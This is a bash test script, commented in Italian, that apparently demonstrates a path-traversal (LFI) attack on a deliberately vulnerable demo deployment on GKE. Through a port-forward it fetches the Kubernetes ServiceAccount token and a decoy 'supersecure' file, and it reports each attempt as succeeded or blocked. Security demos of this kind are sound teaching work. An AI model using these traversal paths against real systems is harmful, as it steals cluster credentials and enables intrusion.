#!/bin/bash
# Esegue l'attacco LFI su GKE contro il deployment demo-node:
#   - [satoken]    legge il token del ServiceAccount montato da KUBERNETES STESSO
#   - [supertoken] legge l'easter egg come-to-code-supersecure-token
#
# Gestisce da solo il port-forward: lo apre in background, attacca, lo chiude.
# Prerequisito: cluster acceso (../notes/resume-gke.sh) + deployment demo-node applicato
#               (vedi notes/docs/gke-setup.md § "5-ter. Demo LFI + token su GKE").
#
# Uso:
#   ./tests/test-gke.sh                 # tutti gli attacchi, deploy 'demo-node', porta 6662
#   ./tests/test-gke.sh satoken         # solo il token del ServiceAccount
#   ./tests/test-gke.sh -p 8080 -d demo-node   # porta/deploy custom
#
# Colori (dal punto di vista del difensore): RED = riuscito (male) / GREEN = bloccato (bene).

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[0;33m'; BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

PORT=6662
DEPLOY=demo-node
SELECTION=()

while [ $# -gt 0 ]; do
  case "$1" in
    -p|--port)   PORT="$2"; shift 2 ;;
    -d|--deploy) DEPLOY="$2"; shift 2 ;;
    -h|--help)
      sed -n '2,18p' "$0"; exit 0 ;;
    satoken|supertoken) SELECTION+=("$1"); shift ;;
    *) echo "Argomento sconosciuto: '$1' (validi: satoken supertoken, -p, -d)"; exit 1 ;;
  esac
done
[ ${#SELECTION[@]} -eq 0 ] && SELECTION=(satoken supertoken)

# Path (traversal) letti via l'endpoint LFI
SA_PATH="../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token"
CTC_PATH="../../../../../../var/run/secrets/come-to-code-supersecure-token"

# --- avvia il port-forward in background e assicurati di chiuderlo all'uscita ---
echo -e "${DIM}Apro il port-forward su deploy/${DEPLOY} → localhost:${PORT} ...${NC}"
kubectl port-forward "deploy/${DEPLOY}" "${PORT}:8080" >/dev/null 2>&1 &
PF_PID=$!
trap 'kill "$PF_PID" 2>/dev/null' EXIT

# attendi che l'endpoint risponda (max ~10s)
ready=0
for _ in $(seq 1 20); do
  if curl -s -o /dev/null "http://localhost:${PORT}/attack/path-traversal?file=/etc/hostname"; then ready=1; break; fi
  sleep 0.5
done
if [ "$ready" != "1" ]; then
  echo -e "${YELLOW}${BOLD}[port-forward non pronto — il pod demo-node è Running? kubectl get pods]${NC}"
  exit 1
fi

# run <title> <description> <file-path>
run() {
  local title="$1" desc="$2" filepath="$3"
  echo -e "\n${BOLD}--- ${title} ---${NC}"
  echo -e "${DIM}${desc}${NC}"
  local tmp code body
  tmp=$(mktemp)
  # curl equivalent:
  #   curl "http://localhost:${PORT}/attack/path-traversal?file=${filepath}"
  code=$(curl -s -o "$tmp" -w '%{http_code}' "http://localhost:${PORT}/attack/path-traversal?file=${filepath}")
  body=$(head -n 8 "$tmp"); rm -f "$tmp"
  if [ -z "$code" ] || [ "$code" = "000" ]; then
    echo -e "${YELLOW}${BOLD}[NO RESPONSE - HTTP ${code}]${NC}"
  elif [ "$code" -ge 200 ] && [ "$code" -lt 400 ]; then
    echo -e "${RED}${BOLD}[ATTACK SUCCEEDED - HTTP ${code}]${NC}"
    echo -e "${RED}${body}${NC}"
  else
    echo -e "${GREEN}${BOLD}[ATTACK BLOCKED - HTTP ${code}]${NC}"
    echo -e "${GREEN}${body}${NC}"
  fi
}

attack_satoken() {
  run "ServiceAccount token  [satoken]  (montato da Kubernetes stesso)" \
      "LFI sul path reale del SA token: su GKE è un JWT VERO, proiettato dal cluster." \
      "$SA_PATH"
}
attack_supertoken() {
  run "come-to-code-supersecure-token  [supertoken]  (easter egg)" \
      "LFI su un file chiamato 'supersecure': dentro c'è ASCII art, non un segreto." \
      "$CTC_PATH"
}

echo -e "${BOLD}=== Attacco LFI su GKE (deploy '${DEPLOY}', porta ${PORT}) ===${NC}"
echo -e "Legenda: ${RED}${BOLD}RED = riuscito${NC} | ${GREEN}${BOLD}GREEN = bloccato${NC}"

for name in "${SELECTION[@]}"; do
  case "$name" in
    satoken)    attack_satoken ;;
    supertoken) attack_supertoken ;;
  esac
done

echo -e "\n${DIM}(il token SA è un JWT reale: decodificalo su jwt.io)${NC}"
echo ""
